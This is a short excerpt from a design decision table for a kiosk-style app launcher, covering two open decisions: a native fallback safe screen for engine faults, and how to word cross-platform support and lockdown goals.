| OD-9 | **Native non-webview last-resort safe screen** (arch-14) | (a) bounded escalation + `watchdog.safe_mode_failed` CRITICAL only (applied); (b) also build a launcher-owned native text window for engine-level faults | **(a) now; (b) deferred** — a human-readable on-screen message for a fault that usually needs a site visit may not justify per-platform native-render cost |
| OD-10 | **Goal 1 wording / supported configs** (RT-11) | (a) reword to "identical app behaviour + telemetry; OS lockdown differs per platform" + baseline note (applied); (b) drop X11 and screen-pinning from support entirely | **(a)** — preserves deployment flexibility with clearly-labelled secure baselines; (b) is stricter but removes options some sites need |
